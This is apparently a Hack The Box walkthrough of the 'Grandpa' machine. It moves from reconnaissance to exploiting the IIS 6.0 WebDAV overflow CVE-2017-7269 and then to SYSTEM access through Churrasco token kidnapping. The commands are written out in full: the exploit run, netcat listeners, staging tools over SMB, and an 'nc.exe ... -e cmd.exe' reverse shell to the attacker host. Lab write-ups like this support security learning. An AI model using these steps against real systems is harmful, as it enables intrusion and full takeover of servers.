---
layout: single
title: Grandpa - Hack The Box
excerpt: "Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge."
date: 2025-05-21
classes: wide
header:
  teaser: /img2/grandpa.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow [RCE]
  - Token Kidnapping - Churrasco [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open --min-rate 5000 -vvv -n -Pn 10.10.10.14
```

![](/img2/Pasted%20image%2020250520201054.png)

- Whatweb

```bash
whatweb http://10.10.10.14/
```

![](/img2/Pasted%20image%2020250520201221.png)

- Gobuster

![](/img2/Pasted%20image%2020250520203203.png)


## Exploitation

- Buffer Overflow

```bash
searchsploit IIS 6.0
```

![](/img2/Pasted%20image%2020250520220356.png)

https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell

```bash
python2 exploit.py 10.10.10.14 80 10.10.16.7 9000
```

```bash
rlwrap nc -nlvp 9000
```

## Post-exploitation

- Check user privileges

```cmd
whoami /priv
```

![](/img2/Pasted%20image%2020250521094110.png)

- Check OS Version

```cmd
systeminfo
```

![](/img2/Pasted%20image%2020250521105130.png)

- Copy nc and churrasco

```bash
impacket-smbserver smbFolder -smb $(pwd) -smb2support
```

https://github.com/int0x33/nc.exe/blob/master/nc.exe

```cmd
copy \\10.10.16.7\smbFolder\nc.exe
```

https://github.com/Re4son/Churrasco/blob/master/churrasco.exe

```cmd
copy \\10.10.16.7\smbFolder\churrasco.exe
```

- Run reverse shell as system

```cmd
echo nc.exe 10.10.16.7 4444 -e cmd.exe > exploit.bat
```

```cmd
churrasco.exe -d exploit.bat
```

![](/img2/Pasted%20image%2020250521105034.png)

```bash
rlwrap nc -nvlp 4444
```

![](/img2/Pasted%20image%2020250521104740.png)